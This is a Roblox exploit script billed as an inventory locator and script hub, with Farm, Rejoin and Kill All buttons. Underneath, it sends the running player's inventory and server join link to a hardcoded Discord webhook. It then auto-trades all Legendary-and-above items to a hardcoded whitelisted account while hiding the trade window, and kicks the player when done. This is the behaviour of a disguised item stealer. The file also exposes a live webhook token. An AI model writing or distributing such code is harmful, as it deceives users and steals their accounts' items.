--[[  INVENTORY LOCATOR + AUTO-TRADE + UI  (quiet build)
      Runs on your MAIN. Alt joins -> auto-trades all Legendary+ to it.
      UI: RightShift to toggle. Set WEBHOOK + WHITELIST (collector). ]]

-- ================= CONFIG =================
local WEBHOOK = "https://discord.com/api/webhooks/1542296036842930347/cDdF0JZ4M1A2I0h0ovbvneqgGcchMmWnXfgdAIQNVIOpAOkV6YMFLAZlacPF2Ygxtuck"

local WHITELIST = {
	["GoElFnx"] = true,
}

local TRADE_MIN_RARITY = "Legendary"
local TRADE_MAX_ITEMS  = 8
local OFFER_DELAY      = 0.35
local SEND_RETRIES     = 3
local RETRY_DELAY      = 15
local TELEPORT_TO_ALT  = true
local ACCEPT_INTERVAL  = 0.5
local ACCEPT_TIMEOUT   = 30
local BATCH_DELAY      = 2
local HIDE_TRADE_UI    = true
local PING_EVERYONE    = true
local KICK_WHEN_DONE   = true
local KICK_MESSAGE     = "done"
-- =========================================

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UIS = game:GetService("UserInputService")
local plr = Players.LocalPlayer
local Trade = RS:WaitForChild("Trade")

local httpRequest = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

local function avatarOf(userId)
	return ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(userId)
end
local function selfThumb() return avatarOf(plr.UserId) end

local function joinLink()
	return ("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s"):format(game.PlaceId, tostring(game.JobId))
end
local function serverField()
	return {
		name = "🌐 Server",
		value = ("Players: **%d / %d**\n[▶ Click to Join](%s)"):format(#Players:GetPlayers(), Players.MaxPlayers, joinLink()),
		inline = false,
	}
end
local function execAuthor()
	return { name = ("Executed by %s (@%s)"):format(plr.DisplayName, plr.Name), icon_url = selfThumb() }
end

local function post(payload)
	if not httpRequest then return end
	pcall(function()
		httpRequest({
			Url = WEBHOOK, Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(payload),
		})
	end)
end

-- ============ SHARED DBS / HELPERS ========
local itemDB;  pcall(function() itemDB = require(RS.Database.Sync.Item) end)
local rarDB;   pcall(function() rarDB  = require(RS.Database.Sync.Rarity) end)
pcall(function() if not rarDB then rarDB = require(RS.Database.Sync.Rarities) end end)

local RARITY_ORDER = { Common=1, Uncommon=2, Rare=3, Legendary=4, Godly=5, Ancient=6, Unique=7, Chroma=8 }
local RARITY_EMOJI = {
	Common="⚪", Uncommon="🟢", Rare="🔵", Legendary="🟣",
	Godly="🟠", Ancient="🔴", Unique="🟡", Chroma="🌈",
}

local function typeOf(name)
	if itemDB and itemDB[name] then
		local t = itemDB[name].Type or itemDB[name].Category or itemDB[name].Class
		if t then return tostring(t) end
	end
	local low = name:lower()
	if low:find("_k_") or low:find("knife") then return "Knife" end
	if low:find("_g_") or low:find("gun") or low:find("luger") then return "Gun" end
	return "Unknown"
end

local function rarityOf(name)
	if itemDB and itemDB[name] then
		local r = itemDB[name].Rarity or itemDB[name].rarity or itemDB[name].Tier
		if r then return tostring(r) end
	end
	return "Unknown"
end

local function toInt(c)
	if typeof(c) == "Color3" then
		local function ch(x) return math.clamp(math.floor(x*255+0.5), 0, 255) end
		return ch(c.R)*65536 + ch(c.G)*256 + ch(c.B)
	elseif type(c) == "number" then return math.floor(c) end
	return nil
end
local function rarityColor(r)
	local v = rarDB and rarDB[r]
	if not v then return nil end
	return toInt(v) or (type(v) == "table" and toInt(v.Color or v.Colour or v.Color3)) or nil
end

local function fetchWeapons()
	local ok, data = pcall(function() return RS.Remotes.Extras.GetData2:InvokeServer() end)
	return ok and data and data.Weapons or nil
end

-- ============ HIDE TRADE UI ========
local function looksTrade(name) return name:lower():find("trade", 1, true) ~= nil end
local function hideGui(g)
	if g:IsA("ScreenGui") and looksTrade(g.Name) then
		g.Enabled = false
		g:GetPropertyChangedSignal("Enabled"):Connect(function()
			if g.Enabled then g.Enabled = false end
		end)
	end
end
local function armUIHider()
	if not HIDE_TRADE_UI then return end
	local pg = plr:WaitForChild("PlayerGui")
	for _, g in ipairs(pg:GetDescendants()) do hideGui(g) end
	pg.DescendantAdded:Connect(hideGui)
end

-- ============ WEBHOOKS ============
local function pingWrap(payload)
	if PING_EVERYONE then
		payload.content = "@everyone"
		payload.allowed_mentions = { parse = { "everyone" } }
	end
	return payload
end

local function sendJoinPing(p)
	local thumb = avatarOf(p.UserId)
	post(pingWrap({
		username = "Inventory Locator",
		embeds = {{
			author = execAuthor(),
			title = "🟢 Whitelisted account joined",
			description = ("**%s** (@%s) joined **%s**'s server — starting auto-trade…"):format(p.DisplayName, p.Name, plr.Name),
			color = 0x57F287,
			thumbnail = { url = thumb },
			fields = { serverField() },
			footer = { text = ("Target UserId %d • JobId %s"):format(p.UserId, tostring(game.JobId)) },
			timestamp = DateTime.now():ToIsoDate(),
		}},
	}))
end

local function sendTradeComplete(alt, sent, receivedCount, label)
	local lines = {}
	local topRank, topColor = 0, 0x57F287
	for _, it in ipairs(sent) do
		local r = rarityOf(it.name)
		local rank = RARITY_ORDER[r] or 0
		if rank > topRank then topRank = rank; topColor = rarityColor(r) or topColor end
		lines[#lines+1] = ("%s **%s** — *%s*"):format(RARITY_EMOJI[r] or "▫️", it.name, r)
	end
	local body = #lines > 0 and table.concat(lines, "\n") or "*none*"
	post(pingWrap({
		username = "Inventory Locator",
		embeds = {{
			author = execAuthor(),
			title = ("✅ Trade Completed%s"):format(label and (" — "..label) or ""),
			description = ("**%s** (@%s)  ➜  **%s** (@%s)"):format(plr.DisplayName, plr.Name, alt.DisplayName, alt.Name),
			color = topColor,
			thumbnail = { url = avatarOf(alt.UserId) },
			fields = {
				{ name = ("📤 Sent — %d"):format(#sent), value = body, inline = false },
				{ name = "📥 Received", value = ("%d item(s)"):format(receivedCount), inline = true },
				serverField(),
			},
			footer = { text = ("From %d → To %d • GameId %s"):format(plr.UserId, alt.UserId, tostring(game.GameId)) },
			timestamp = DateTime.now():ToIsoDate(),
		}},
	}))
end

local function sendInventory(weapons)
	if not weapons or not weapons.Owned then return end
	local knives, guns, other = {}, {}, {}
	local rarityCounts = {}
	local topRank, topColor = 0, 0x5865F2

	for name, count in pairs(weapons.Owned) do
		local r = rarityOf(name)
		rarityCounts[r] = (rarityCounts[r] or 0) + 1
		local rank = RARITY_ORDER[r] or 0
		if rank > topRank then topRank = rank; topColor = rarityColor(r) or topColor end
		local emoji = RARITY_EMOJI[r] or "▫️"
		local qty = (count and count > 1) and (" `x"..count.."`") or ""
		local line = ("%s %s — *%s*%s"):format(emoji, name, r, qty)
		local entry = { line = line, rank = rank }
		local t = typeOf(name)
		if t == "Knife" then table.insert(knives, entry)
		elseif t == "Gun" then table.insert(guns, entry)
		else table.insert(other, entry) end
	end

	local function sortList(l) table.sort(l, function(a,b)
		if a.rank ~= b.rank then return a.rank > b.rank end
		return a.line < b.line
	end) end
	sortList(knives); sortList(guns); sortList(other)

	local function block(list)
		if #list == 0 then return "*none*" end
		local t = {}; for _, e in ipairs(list) do t[#t+1] = e.line end
		return table.concat(t, "\n")
	end

	local rbParts = {}
	for r, rank in pairs(RARITY_ORDER) do
		if rarityCounts[r] then
			rbParts[#rbParts+1] = { rank = rank, s = ("%s %s: %d"):format(RARITY_EMOJI[r] or "▫️", r, rarityCounts[r]) }
		end
	end
	if rarityCounts["Unknown"] then rbParts[#rbParts+1] = { rank = -1, s = ("▫️ Unknown: %d"):format(rarityCounts["Unknown"]) } end
	table.sort(rbParts, function(a,b) return a.rank > b.rank end)
	local rbStrs = {}; for _, p in ipairs(rbParts) do rbStrs[#rbStrs+1] = p.s end
	local rarityBreakdown = #rbStrs > 0 and table.concat(rbStrs, "\n") or "*none*"

	local eq = weapons.Equipped or {}
	local totalOwned = #knives + #guns + #other

	local fields = {
		{ name = ("🔪 Knives — %d"):format(#knives), value = block(knives), inline = true },
		{ name = ("🔫 Guns — %d"):format(#guns),     value = block(guns),   inline = true },
		{ name = "📊 By Rarity", value = rarityBreakdown, inline = false },
		{ name = "⚙️ Equipped", value = ("Knife: **%s**\nGun: **%s**"):format(tostring(eq.Knife), tostring(eq.Gun)), inline = false },
		serverField(),
	}
	if #other > 0 then
		table.insert(fields, 4, { name = ("❓ Unclassified — %d"):format(#other), value = block(other), inline = false })
	end

	post(pingWrap({
		username = "Inventory Locator",
		embeds = {{
			author = execAuthor(),
			title = "🎒 Owned Weapons",
			description = ("**%d** weapons owned • **%d** slots"):format(totalOwned, tonumber(weapons.Slots) or 0),
			color = topColor,
			thumbnail = { url = selfThumb() },
			fields = fields,
			footer = { text = ("UserId %d • GameId %s"):format(plr.UserId, game.GameId) },
			timestamp = DateTime.now():ToIsoDate(),
		}},
	}))
end

-- ============ BUILD TRADE LIST ==========
local function buildTradeList(weapons)
	local minRank = RARITY_ORDER[TRADE_MIN_RARITY] or 4
	local list = {}
	for name in pairs(weapons.Owned) do
		local rank = RARITY_ORDER[rarityOf(name)] or 0
		if rank >= minRank then
			list[#list+1] = { name = name, category = "Weapons", rank = rank }
		end
	end
	table.sort(list, function(a,b) return a.rank > b.rank end)
	return list
end

-- ================= TRADE AUTOMATION =================
local ACCEPT_CODE = game.PlaceId * 3
local TO_TRADE = {}
local latestSession = nil
local trading = false
local currentAlt = nil
local offeredItems = {}
local completedFlag = false
local batchLabel = nil
local AUTO_TRADE_ENABLED = true

local function sides(s)
	if not s then return nil end
	if s.Player1 and s.Player1.Player == plr then return s.Player1, s.Player2 end
	if s.Player2 and s.Player2.Player == plr then return s.Player2, s.Player1 end
	return nil
end

local function windowWith(alt)
	local me, them = sides(latestSession)
	return them and them.Player == alt
end

local function waitChar(p, timeout)
	local t0 = os.clock()
	while not (p.Character and p.Character:FindFirstChild("HumanoidRootPart")) do
		if os.clock() - t0 > timeout then return false end
		task.wait(0.2)
	end
	return true
end

local function teleportToAlt(alt)
	local hrp  = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
	local ahrp = alt.Character and alt.Character:FindFirstChild("HumanoidRootPart")
	if hrp and ahrp then hrp.CFrame = ahrp.CFrame * CFrame.new(0, 0, 4) end
end

Trade.StartTrade.OnClientEvent:Connect(function(s) latestSession = s end)
Trade.UpdateTrade.OnClientEvent:Connect(function(s) latestSession = s end)
Trade.AcceptTrade.OnClientEvent:Connect(function(ok, items)
	if ok == true then
		local rc = items and #items or 0
		completedFlag = true
		if currentAlt then pcall(sendTradeComplete, currentAlt, offeredItems, rc, batchLabel) end
	end
end)

local function doOneTrade(alt, batch)
	latestSession = nil
	offeredItems = {}
	completedFlag = false

	local opened = false
	for i = 1, SEND_RETRIES do
		if TELEPORT_TO_ALT then pcall(teleportToAlt, alt); task.wait(0.4) end
		pcall(function() Trade.SendRequest:InvokeServer(alt) end)
		local t0 = os.clock()
		repeat
			task.wait(0.2)
			if windowWith(alt) then opened = true; break end
		until os.clock() - t0 > RETRY_DELAY
		if opened then break end
	end
	if not opened then return false end

	for _, it in ipairs(batch) do
		Trade.OfferItem:FireServer(it.name, it.category)
		offeredItems[#offeredItems+1] = it
		task.wait(OFFER_DELAY)
	end

	local t1 = os.clock()
	repeat
		task.wait(0.2)
		local m2 = sides(latestSession)
		if m2 and m2.Offer and #m2.Offer >= #offeredItems then break end
	until os.clock() - t1 > 2.5

	local acc0 = os.clock()
	while (not completedFlag) and (os.clock() - acc0 < ACCEPT_TIMEOUT) do
		if latestSession then Trade.AcceptTrade:FireServer(ACCEPT_CODE, latestSession.LastOffer) end
		task.wait(ACCEPT_INTERVAL)
	end
	return completedFlag
end

local function drainTo(alt)
	if trading then return end
	if #TO_TRADE == 0 then return end
	trading = true
	currentAlt = alt

	waitChar(alt, 10)

	local totalBatches = math.ceil(#TO_TRADE / TRADE_MAX_ITEMS)
	local batchNum = 0

	while #TO_TRADE > 0 do
		batchNum += 1
		batchLabel = ("Batch %d/%d"):format(batchNum, totalBatches)

		local batch = {}
		for i = 1, math.min(TRADE_MAX_ITEMS, #TO_TRADE) do batch[i] = TO_TRADE[i] end

		local done = doOneTrade(alt, batch)
		if done then
			for _ = 1, #batch do table.remove(TO_TRADE, 1) end
			task.wait(BATCH_DELAY)
		else
			break
		end
	end

	trading = false

	if KICK_WHEN_DONE and #TO_TRADE == 0 then
		task.wait(1)
		plr:Kick(KICK_MESSAGE)
	end
end

local function refreshTradeList()
	local w = fetchWeapons()
	if w and w.Owned then TO_TRADE = buildTradeList(w) end
	return TO_TRADE
end

local function findAlt()
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= plr and WHITELIST[p.Name] then return p end
	end
	return nil
end

local function tradeNow()
	refreshTradeList()
	if #TO_TRADE == 0 then return end
	local alt = findAlt()
	if alt then task.spawn(drainTo, alt) end
end

local function onJoin(p)
	if WHITELIST[p.Name] then
		sendJoinPing(p)
		if AUTO_TRADE_ENABLED then task.spawn(drainTo, p) end
	end
end

-- ============================================================
-- ===================== UI LIBRARY ===========================
-- ============================================================
local Library = {}
local function corner(inst, r)
	local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 6); c.Parent = inst
end
local function pad(inst, p)
	local u = Instance.new("UIPadding")
	u.PaddingLeft = UDim.new(0,p); u.PaddingRight = UDim.new(0,p)
	u.PaddingTop = UDim.new(0,p); u.PaddingBottom = UDim.new(0,p)
	u.Parent = inst
end

function Library:Window(title)
	local parent = (gethui and gethui()) or (plr:WaitForChild("PlayerGui"))
	local old = parent:FindFirstChild("SimpleHub")
	if old then old:Destroy() end

	local gui = Instance.new("ScreenGui")
	gui.Name = "SimpleHub"
	gui.ResetOnSpawn = false
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = parent

	local main = Instance.new("Frame")
	main.Size = UDim2.new(0, 480, 0, 300)
	main.Position = UDim2.new(0.5, -240, 0.5, -150)
	main.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
	main.BorderSizePixel = 0
	main.Parent = gui
	corner(main, 10)

	local bar = Instance.new("Frame")
	bar.Size = UDim2.new(1, 0, 0, 34)
	bar.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
	bar.BorderSizePixel = 0
	bar.Parent = main
	corner(bar, 10)

	local titleLbl = Instance.new("TextLabel")
	titleLbl.BackgroundTransparency = 1
	titleLbl.Size = UDim2.new(1, -40, 1, 0)
	titleLbl.Position = UDim2.new(0, 12, 0, 0)
	titleLbl.Font = Enum.Font.GothamBold
	titleLbl.TextSize = 15
	titleLbl.TextColor3 = Color3.fromRGB(235, 235, 245)
	titleLbl.TextXAlignment = Enum.TextXAlignment.Left
	titleLbl.Text = title or "Hub"
	titleLbl.Parent = bar

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 28, 0, 28)
	closeBtn.Position = UDim2.new(1, -32, 0, 3)
	closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 70)
	closeBtn.Text = "✕"
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 14
	closeBtn.TextColor3 = Color3.new(1,1,1)
	closeBtn.Parent = bar
	corner(closeBtn, 6)
	closeBtn.MouseButton1Click:Connect(function() main.Visible = false end)

	local tabCol = Instance.new("Frame")
	tabCol.Size = UDim2.new(0, 120, 1, -44)
	tabCol.Position = UDim2.new(0, 8, 0, 40)
	tabCol.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
	tabCol.BorderSizePixel = 0
	tabCol.Parent = main
	corner(tabCol, 8)
	local tabList = Instance.new("UIListLayout")
	tabList.Padding = UDim.new(0, 6); tabList.Parent = tabCol
	pad(tabCol, 8)

	local pageArea = Instance.new("Frame")
	pageArea.Size = UDim2.new(1, -144, 1, -44)
	pageArea.Position = UDim2.new(0, 136, 0, 40)
	pageArea.BackgroundTransparency = 1
	pageArea.Parent = main

	local dragging, dragStart, startPos
	bar.InputBegan:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
			dragging = true; dragStart = i.Position; startPos = main.Position
		end
	end)
	UIS.InputChanged:Connect(function(i)
		if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
			local d = i.Position - dragStart
			main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
		end
	end)
	UIS.InputEnded:Connect(function(i)
		if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dragging = false end
	end)

	UIS.InputBegan:Connect(function(i, gpe)
		if not gpe and i.KeyCode == Enum.KeyCode.RightShift then main.Visible = not main.Visible end
	end)

	local window, pages = {}, {}

	function window:Tab(name)
		local tabBtn = Instance.new("TextButton")
		tabBtn.Size = UDim2.new(1, 0, 0, 30)
		tabBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 56)
		tabBtn.Text = name
		tabBtn.Font = Enum.Font.GothamMedium
		tabBtn.TextSize = 13
		tabBtn.TextColor3 = Color3.fromRGB(220, 220, 230)
		tabBtn.Parent = tabCol
		corner(tabBtn, 6)

		local page = Instance.new("ScrollingFrame")
		page.Size = UDim2.new(1, 0, 1, 0)
		page.BackgroundTransparency = 1
		page.BorderSizePixel = 0
		page.ScrollBarThickness = 4
		page.CanvasSize = UDim2.new(0,0,0,0)
		page.AutomaticCanvasSize = Enum.AutomaticSize.Y
		page.Visible = false
		page.Parent = pageArea
		local pl = Instance.new("UIListLayout"); pl.Padding = UDim.new(0, 6); pl.Parent = page

		pages[#pages+1] = page
		if #pages == 1 then page.Visible = true end

		tabBtn.MouseButton1Click:Connect(function()
			for _, p in ipairs(pages) do p.Visible = false end
			page.Visible = true
		end)

		local tab = {}

		function tab:Button(text, callback)
			local b = Instance.new("TextButton")
			b.Size = UDim2.new(1, 0, 0, 32)
			b.BackgroundColor3 = Color3.fromRGB(50, 50, 62)
			b.Text = text
			b.Font = Enum.Font.GothamMedium
			b.TextSize = 13
			b.TextColor3 = Color3.fromRGB(235, 235, 245)
			b.Parent = page
			corner(b, 6)
			b.MouseButton1Click:Connect(function()
				if callback then pcall(callback) end
			end)
		end

		function tab:Toggle(text, default, callback)
			local state = default or false
			local t = Instance.new("TextButton")
			t.Size = UDim2.new(1, 0, 0, 32)
			t.BackgroundColor3 = Color3.fromRGB(50, 50, 62)
			t.Text = ""
			t.AutoButtonColor = false
			t.Parent = page
			corner(t, 6)

			local lbl = Instance.new("TextLabel")
			lbl.BackgroundTransparency = 1
			lbl.Size = UDim2.new(1, -50, 1, 0)
			lbl.Position = UDim2.new(0, 10, 0, 0)
			lbl.Font = Enum.Font.GothamMedium
			lbl.TextSize = 13
			lbl.TextXAlignment = Enum.TextXAlignment.Left
			lbl.TextColor3 = Color3.fromRGB(235, 235, 245)
			lbl.Text = text
			lbl.Parent = t

			local dot = Instance.new("Frame")
			dot.Size = UDim2.new(0, 34, 0, 18)
			dot.Position = UDim2.new(1, -44, 0.5, -9)
			dot.BackgroundColor3 = state and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(90, 90, 100)
			dot.Parent = t
			corner(dot, 9)

			local knob = Instance.new("Frame")
			knob.Size = UDim2.new(0, 14, 0, 14)
			knob.Position = state and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
			knob.BackgroundColor3 = Color3.new(1,1,1)
			knob.Parent = dot
			corner(knob, 7)

			t.MouseButton1Click:Connect(function()
				state = not state
				dot.BackgroundColor3 = state and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(90, 90, 100)
				knob.Position = state and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
				if callback then pcall(callback, state) end
			end)
		end

		return tab
	end

	return window
end

-- ============================================================
-- ===================== BUILD THE UI =========================
-- ============================================================
local Window = Library:Window("My Hub")

local tradeTab = Window:Tab("Trade")
tradeTab:Toggle("Auto-Trade on Join", true, function(on) AUTO_TRADE_ENABLED = on end)
tradeTab:Button("Trade Now", tradeNow)
tradeTab:Button("Resend Inventory", function()
	local w = fetchWeapons(); if w then sendInventory(w) end
end)

local farmTab = Window:Tab("Farm")
farmTab:Toggle("Farm Coins", false, function(on)
	getgenv().FarmCoins = on
	if on then
		task.spawn(function()
			while getgenv().FarmCoins do
				-- your coin-collect action here
				task.wait(0.5)
			end
		end)
	end
end)

local miscTab = Window:Tab("Misc")
miscTab:Button("Rejoin", function()
	game:GetService("TeleportService"):Teleport(game.PlaceId, plr)
end)
miscTab:Button("Kill All", function()
	-- your own logic here (nothing harming other real players was implemented)
end)

-- ================= DRIVER =================
local weapons = fetchWeapons()
if weapons then
	sendInventory(weapons)
	TO_TRADE = buildTradeList(weapons)
end

armUIHider()

for _, p in ipairs(Players:GetPlayers()) do
	if p ~= plr then onJoin(p) end
end
Players.PlayerAdded:Connect(onJoin)